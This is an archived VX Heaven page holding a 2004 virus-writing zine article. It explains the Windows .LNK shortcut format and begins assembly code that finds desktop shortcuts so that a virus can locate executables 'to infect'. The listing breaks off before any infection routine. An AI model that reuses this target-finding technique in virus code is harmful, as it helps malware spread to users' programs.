<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> DiA 'Capture the desktop - scan .LNK files for victims' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="DiA"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, DiA,Capture the desktop - scan .LNK files for victims, network, volume, byte, info, file, error, section, string, desktop, local, offset, dword, size, fasm, share"/>
<meta name="Description" content="Some people have a clean desktop other people have the total choas in the front of them. I speak about &quot;Windows Shortcut Files&quot; aka .LNK files. The shortcuts to applications, documents and other files. Most of the computer noobs use the desktop and the shortcuts very often, why not, the installation programs ask always to create a desktop shortcut. So this is a good way to find victims to infect (eg PE EXE files), if the shortcut file (.lnk) knows where the linked application or document is, we know it too (or must scan the .lnk file to know it)."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"f72dbc66ddafe693e254b1e13c491ae1a7b83187-1498755720-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vdi00.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Capture the desktop - scan .LNK files for victims</h1><p><a href="/lib/?lang=en&amp;author=DiA"> DiA</a><br/> <em><a href="/vx.php?fid=1388#f1388">29a [#8</a></em><br/> <em>November 2004</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vdi00.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=VT#vdi00">Back to index</a>] [<a href="/lib/vdi00.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c1">Intro</a></li>
<li><a href="#c2">LNK format</a></li>
<li><a href="#c3">How to get linked file, theory.</a></li>
<li><a href="#c4">How to get linked file, listing.</a></li>
<li><a href="#c5">How to get linked file, code.</a></li>
<li><a href="#c6">Play more with LNK files</a></li>
<li><a href="#c7">Outro</a></li>
</ul>
<h2><a name="c1"></a>Intro</h2>
<p>Some people have a clean desktop other people have the total choas in the front of them. I speak about "Windows Shortcut Files" aka .LNK files. The shortcuts to applications, documents and other files. Most of the computer noobs use the desktop and the shortcuts very often, why not, the installation programs ask always to create a desktop shortcut. So this is a good way to find victims to infect (eg PE EXE files), if the shortcut file (.lnk) knows where the linked application or document is, we know it too (or must scan the .lnk file to know it).</p>
<p>So lets go, find .lnk files, scan it and lets extract the full path of linked file!</p>
<p>Have much fun with this little article...</p>
<p>Thanks to BlueOwl for testing and his help.</p>
<h2><a name="c2"></a>LNK format</h2>
<p>This is only a quick overview of the .lnk file format, for more information please read "The Windows Shortcut File Format as reverse-engineered by Jesse Hager". This is in my opinion the best document about .lnk files over the web.</p>
<p><strong>Overview:</strong></p>
<table summary="Overview of .lnk file format" border="1">
<tr><td><strong>Section</strong></td><td><strong>Size (hex)</strong></td></tr>
<tr><td>File Header</td><td>4Ch</td></tr>
<tr><td>Shell Item ID List</td><td>??h ;??h means that it doesn't have a static size</td></tr>
<tr><td>File Location Info</td><td>22h</td></tr>
<tr><td>Local Volume Table</td><td>10h + Volume Label (ASCIZ)</td></tr>
<tr><td>Network Volume Table</td><td>14h + Network share name (ASCIZ)</td></tr>
<tr><td>Description String</td><td>??h</td></tr>
<tr><td>Relative Path String</td><td>??h</td></tr>
<tr><td>Working Directory</td><td>??h</td></tr>
<tr><td>Commandline String</td><td>??h</td></tr>
<tr><td>Icon Filename String</td><td>??h</td></tr>
<tr><td>Extra stuff</td><td>??h</td></tr>
</table>
<p><strong>File Header:</strong></p>
<table summary="File Header of .lnk file format" border="1">
<tr><td><strong>Offset</strong></td><td><strong>Size</strong></td><td><strong>Contents</strong></td></tr>
<tr><td>00h</td><td>1 dword</td><td>0000004Ch "L" identifies the .lnk file</td></tr>
<tr><td>04h</td><td>16 dword</td><td>GUID of shortcut file</td></tr>
<tr><td>14h</td><td>1 dword</td><td>Flags</td></tr>
<tr><td>18h</td><td>1 dword</td><td>File Attributes</td></tr>
<tr><td>1Ch</td><td>1 qword</td><td>Time 1</td></tr>
<tr><td>24h</td><td>1 qword</td><td>Time 2</td></tr>
<tr><td>2Ch</td><td>1 qword</td><td>Time 3</td></tr>
<tr><td>34h</td><td>1 dword</td><td>File Length</td></tr>
<tr><td>38h</td><td>1 dword</td><td>Icon Number</td></tr>
<tr><td>3Ch</td><td>1 dword</td><td>ShowWnd Value</td></tr>
<tr><td>40h</td><td>1 dword</td><td>Hot Key</td></tr>
<tr><td>44h</td><td>2 dword</td><td>Unknown, always Zero</td></tr>
</table>
<p><strong>Shell Item ID List:</strong></p>
<p>The Shell Item List section has no static size, it is variable. But thats not a hard problem, because first unsigned short integer (at 4Ch from file begin) indicates the total length of the whole Item List. We only have to read the size, and then add this size to 4Ch, then we are at "File Location Info" section.</p>
<p><strong>File Location Info:</strong></p>
<table summary="File Location Info" border="1">
<tr><td><strong>Offset</strong></td><td><strong>Size</strong></td><td><strong>Contents</strong></td></tr>
<tr><td>00h</td><td>1 dword</td><td>Total length of the structure</td></tr>
<tr><td>04h</td><td>1 dword</td><td>Pointer to first offset at 1Ch</td></tr>
<tr><td>08h</td><td>1 dword</td><td>Flags</td></tr>
<tr><td>0Ch</td><td>1 dword</td><td>Offset of Local Volume Info</td></tr>
<tr><td>10h</td><td>1 dword</td><td>Offset of Base Pathname (local)</td></tr>
<tr><td>14h</td><td>1 dword</td><td>Offset of Network Volume Info</td></tr>
<tr><td>18h</td><td>1 dword</td><td>Offset of Remaining Pathname</td></tr>
</table>
<p><strong>Local Volume Table:</strong></p>
<table summary="Local Volume Table" border="1">
<tr><td><strong>Offset</strong></td><td><strong>Size</strong></td><td><strong>Contents</strong></td></tr>
<tr><td>00h</td><td>1 dword</td><td>Length of the structure</td></tr>
<tr><td>04h</td><td>1 dword</td><td>Type of Volume</td></tr>
<tr><td>08h</td><td>1 dword</td><td>Volume Serial Number</td></tr>
<tr><td>0Ch</td><td>1 dword</td><td>Offset of the Volume Name (10h)</td></tr>
<tr><td>10h</td><td>ASCIZ</td><td>Volume Label !!this is what we want!!</td></tr>
</table>
<p><strong>Network Volume Table:</strong></p>
<table summary="Network Volume Table" border="1">
<tr><td><strong>Offset</strong></td><td><strong>Size</strong></td><td><strong>Contents</strong></td></tr>
<tr><td>00h</td><td>1 dword</td><td>Length of the structure</td></tr>
<tr><td>04h</td><td>1 dword</td><td>Unknown, always 02h?!</td></tr>
<tr><td>08h</td><td>1 dword</td><td>Offset of the Network Share Name (14h)</td></tr>
<tr><td>0Ch</td><td>1 dword</td><td>Unknown, always Zero?</td></tr>
<tr><td>10h</td><td>1 dword</td><td>Unknown, always 20000h?</td></tr>
<tr><td>0Ch</td><td>ASCIZ</td><td>Network Share Name</td></tr>
</table>
<p>Description String, Relative Path String, Working Directory, Commandline String, Icon Filename String and Extra stuff section are uninteresting for this tutorial. For better description read the article I recommend. I think Working Directory and Commandline String are interesting things for finding victims. But thats another story...</p>
<h2><a name="c3"></a>How to get linked file, theory.</h2>
<p>OK, now we know how the .lnk file is build. What we want is the "Volume Label" in the "Local Volume Table" section. But one (not big) problem, it have no static offset, because "Shell Item ID List" section size is variable. We have to read the size of this structure and add it to the "File Header" section, then we are at the "File Location Info" section. From this place it's not hard to get offset of "Volume Label". For better description a little graphik:</p>
<pre>
 *****************************
 | File Begin            00h |
 *****************************
	+
 *****************************
 | File Header           4Ch |
 *****************************
	=
 *****************************
 | offset Shell Item ID List |
 *****************************
</pre>
<p>Now we have the offset to the "Shell Item ID List". First unsigned short integer indicates the size of this section. We read the size, now in this graphik called "ItemSize" (eg F5h or something). Go on:</p>
<pre>
 *****************************
 | File Begin            00h |
 *****************************
	+
 *****************************
 | File Header           4Ch |
 *****************************
	+
 *****************************
 | ItemSize              F5h |
 *****************************
	=
 *****************************
 | offset File Location Info |
 *****************************
</pre>
<p>Wow, we have the offset to the "File Location Info" section, now its not a hard way to get "Volume Label" (linked file). "File Location Info" and "Local Volume Table" have a static size. Appending to the "Local Volume Table" there is the string to the linked file ending with a zero. So lets get the offset of the first character at this string:</p>
<pre>
 *****************************
 | File Begin            00h |
 *****************************
	+
 *****************************
 | File Header           4Ch |
 *****************************
	+
 *****************************
 | ItemSize              F5h |
 *****************************
	+
 *****************************
 | File Location Info    22h |
 *****************************
	+
 *****************************
 | Local Volume Table    10h |
 *****************************
	=
 *****************************
 | offset to Volume Label    |
 *****************************
</pre>
<p>Now we have the offset to our string. It is ASCIZero, so we only have to check byte by byte for an zero. If byte is a zero we have end of string, and as result the full path to the linked application. Good job, theoretical. :) Let's see listing and code...</p>
<h2><a name="c4"></a>How to get linked file, listing.</h2>
<p>Here is the "to do" list for scanning .lnk files on the desktop for victims:</p>
<ol>
<li>Read desktop path from the registry</li>
<li>Check if path string is valid, if not make it valid</li>
<li>Change current directory to the desktop path</li>
<li>Find first .lnk file</li>
<li>No more files? then go to 17.</li>
<li>Map .lnk file to handle with it</li>
<li>Check if .lnk file is valid (first dword must be "L"000000h)</li>
<li>Get offset to "Shell Item ID List" section</li>
<li>Read size of the "Shell Item ID List"</li>
<li>Skip this section (File Header + Shell Item ID List size)</li>
<li>Get offset to "Volume Label"</li>
<li>Get end of the path string and copy the string</li>
<li>Check if extracted path is valid, if not goto 15.</li>
<li>Simple Messagebox (or infection routine :)</li>
<li>Unmap file, and close handles</li>
<li>Find next .lnk file, goto 5.</li>
<li>Exit</li>
</ol>
<h2><a name="c5"></a>How to get linked file, code.</h2>
<div class="asm" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;"><span style="color: black; font-style: italic;">;====================================================================================</span><br/>
<span style="color: black; font-style: italic;">; Example for scanning .lnk files for victims</span><br/>
<span style="color: black; font-style: italic;">; assemble it with FASM 1.56 (www.flatassembler.net)</span><br/>
<span style="color: black; font-style: italic;">; tested under WinXP SP1</span><br/>
<span style="color: black; font-style: italic;">;</span><br/>
<span style="color: black; font-style: italic;">; coded by DiA/rrlf</span><br/>
<span style="color: black; font-style: italic;">; www.vx-dia.de.vu &nbsp;:: &nbsp;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="2a6e436b75424b5e4f5975474b494243444f6a4d4752044e4f">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script></span><br/>
<span style="color: black; font-style: italic;">;<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="6b5656565656565656565656565656565656565656565656565656565656565656565656565656565656565656565656565656565656565656565656565656565656">[email&#160;protected]</a><script data-cfhash='f9e31' type="text/rocketscript">/* <![CDATA[ */!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()/* ]]> */</script>===================</span><br/>
<span style="color: black; font-style: italic;">;</span><br/>
<span style="color: black; font-style: italic;">;_____LNKscan.asm_____cut_____start__________________________________________________</span><br/>
<br/>
include <span style="color: #7f007f;">&quot;%fasminc%\win32ax.inc&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;equates</span><br/>
<br/>
LNKscan<span style="color: #339933;">:</span><br/>
<span style="color: black; font-style: italic;">;-----get desktop path from registry--------------------</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke RegOpenKeyEx<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;open a reg key</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;HKEY_CURRENT_USER<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;handle of the key</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DesktopSubkey<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;the subkey string</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;reserved</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;KEY_ALL_ACCESS<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;security access mask</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;RegHandle &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;save here the handle</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;error?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> ErrorMsg &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;show error message</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke RegQueryValueEx<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;read a value</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>RegHandle<span style="color: black;">&#93;</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;handle of open key</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DesktopValue<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;the value name &quot;Desktop&quot;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #ff0000;">0</span><span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;reserved</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;Reg_SZ<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;we want a string</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DesktopPath<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;save here the desktop path</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DesktopSize &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;size of reserved place</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;error?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jnz</span> ErrorMsg &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;if so show a error message</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke RegCloseKey<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;we have the desktop path, close key</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: #0000ff; font-weight: bold;">dword</span> <span style="color: black;">&#91;</span>RegHandle<span style="color: black;">&#93;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;with the handle</span><br/>
<span style="color: black; font-style: italic;">;-----get desktop path from registry---end--------------</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----check if path is valid, if not make it valid------</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: #339933;">,</span> DesktopPath &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;address of string</span><br/>
<br/>
GetZero<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;check for end of the string</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> GotZero &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;we have the zero</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;address + 1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">jmp</span> GetZero &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;check next byte</span><br/>
<br/>
GotZero<span style="color: #339933;">:</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">dec</span> <span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;address (,0) - 1</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;\&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;check for the slash</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> HaveSlash &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;and dont place a slash</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">inc</span> <span style="color: #46aa03; font-weight: bold;">edx</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;jmp after last byte of the string</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span><span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #7f007f;">&quot;\&quot;</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;place the \</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">mov</span> <span style="color: #0000ff; font-weight: bold;">byte</span> <span style="color: black;">&#91;</span><span style="color: #46aa03; font-weight: bold;">edx</span> <span style="color: #339933;">+</span> 1d<span style="color: black;">&#93;</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">; &quot;String&quot;,0 &lt;-</span><br/>
<br/>
HaveSlash<span style="color: #339933;">:</span><br/>
<span style="color: black; font-style: italic;">;-----check if path is valid, if not make it valid--end-</span><br/>
<br/>
<br/>
<span style="color: black; font-style: italic;">;-----change directory to desktop path------------------</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; invoke SetCurrentDirectory<span style="color: #339933;">,</span>\ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;change directory</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;DesktopPath &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;to the desktop path</span><br/>
<br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">cmp</span> <span style="color: #46aa03; font-weight: bold;">eax</span><span style="color: #339933;">,</span> <span style="color: #ff0000;">0</span> &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<span style="color: black; font-style: italic;">;error?</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #00007f; font-weight: bold;">je</span> ErrorMsg &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">;no path, no victims</span><br/>
